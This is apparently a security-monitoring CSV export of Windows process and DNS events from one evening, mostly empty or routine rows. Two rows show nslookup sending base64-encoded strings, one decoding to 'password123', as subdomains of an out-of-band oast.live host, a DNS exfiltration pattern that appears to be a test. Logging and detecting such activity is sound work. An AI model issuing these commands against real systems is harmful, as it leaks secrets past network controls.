"@timestamp","process.name","process.command_line","network.transport","source.port","dns.type","event.action"
"Jun 13, 2025 @ 21:29:05.207","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:59.908","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:54.616","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:49.327","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:44.042","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:38.757","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:33.474","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:28.189","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:25.271","conhost.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:28:25.232","sc.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:28:25.222","-","-","-","-","-",None
"Jun 13, 2025 @ 21:28:25.062","svchost.exe","C:\Windows\system32\svchost.exe -k InvSvcGroup -p","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:25.026","services.exe","-","-","-","-","logged-in"
"Jun 13, 2025 @ 21:28:25.026","-","-","-","-","-","logged-in-special"
"Jun 13, 2025 @ 21:28:24.526","conhost.exe","\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:24.471","sc.exe","""C:\Windows\system32\sc.exe"" start InventorySvc","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:22.902","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:19.670","taskhostw.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:28:19.060","taskhostw.exe","taskhostw.exe SYSTEM","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:17.617","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:12.318","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:09.269","backgroundTaskHost.exe","""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:Global.DesktopSpotlight.AppXz2j21w56bgxkgsjhtn7zkjsepq96erz2.mca","-","-","-","Process creation"
"Jun 13, 2025 @ 21:28:07.030","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:28:01.742","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:56.459","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:51.178","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:45.896","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:40.611","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:35.328","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:29.988","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:24.698","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:19.406","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:14.121","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:08.837","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:27:03.552","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:58.264","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:52.981","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:47.697","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:42.414","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:37.131","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:31.847","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:26.559","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:23.611","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:21.276","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:15.994","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:10.709","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:05.424","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:26:00.139","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:54.854","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:49.569","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:44.283","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:38.994","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:33.708","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:28.424","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:23.140","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:17.857","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:12.575","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:07.293","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:25:02.010","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:56.722","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:51.441","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:46.154","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:40.872","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:35.588","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:30.306","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:25.023","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:19.742","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:14.460","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:09.178","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:24:03.895","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:58.604","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:53.319","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:48.033","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:42.751","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:37.468","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:32.183","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:26.901","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:21.618","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:16.334","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:11.051","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:05.764","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:23:00.479","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:55.193","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:49.910","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:44.627","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:39.343","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:34.059","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:28.772","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:23.490","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:18.200","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:12.908","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:07.620","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:22:02.335","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:57.046","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:51.763","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:50.431","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:46.474","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:41.189","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:35.896","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:30.601","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:25.315","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:20.033","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:14.751","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:09.468","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:21:04.187","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:58.903","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:53.621","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:48.339","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:43.054","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:37.757","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:32.471","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:27.183","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:25.673","WmiPrvSE.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:20:21.899","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:16.616","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:11.333","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:06.049","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:20:00.767","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:55.482","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:50.169","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:44.879","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:42.352","nslookup.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:19:41.397","nslookup.exe","""C:\Windows\system32\nslookup.exe"" cGFzc3dvcmQxMjM=.d163knb70n71ipbqb3c061ieukueeeu15.oast.live","-","-","-","Process creation"
"Jun 13, 2025 @ 21:19:39.589","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:34.305","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:29.023","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:27.358","nslookup.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:19:26.407","nslookup.exe","""C:\Windows\system32\nslookup.exe"" aGVsbG8gdGhlcmUgaSB0cnkgdGVzdGluZyA=.d163knb70n71ipbqb3c061ieukueeeu15.oast.live","-","-","-","Process creation"
"Jun 13, 2025 @ 21:19:23.738","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:18.453","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:13.170","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:07.888","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:19:02.601","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:57.318","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:54.325","taskhostw.exe","-","-","-","-","Process terminated"
"Jun 13, 2025 @ 21:18:53.523","taskhostw.exe","taskhostw.exe NGCKeyPregen","-","-","-","Process creation"
"Jun 13, 2025 @ 21:18:52.034","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:46.750","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:41.468","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:36.183","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:30.901","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:25.620","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:20.337","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:15.052","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:09.769","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:18:04.479","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:59.193","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:53.905","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:48.620","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:43.336","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:38.053","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:32.770","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:27.485","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:22.198","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:16.916","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:15.773","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:11.632","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:06.349","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:17:01.066","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:55.777","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:50.494","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:45.205","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:39.918","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:34.632","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:29.348","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:24.066","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:18.783","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:13.500","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:08.217","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:16:02.934","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:57.646","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:52.346","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:47.064","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:41.779","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:38.559","amazon-ssm-agent.exe","-","-","-","-","DNSEvent (DNS query)"
"Jun 13, 2025 @ 21:15:36.495","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:31.212","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:25.928","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:20.640","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:15.358","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:10.075","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:15:04.787","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:59.504","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:54.222","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:48.938","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:43.655","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:38.372","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:33.088","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:27.805","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:22.522","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:17.235","-","-","-","-","-","-"
"Jun 13, 2025 @ 21:14:11.932","-","-","-","-","-","-"
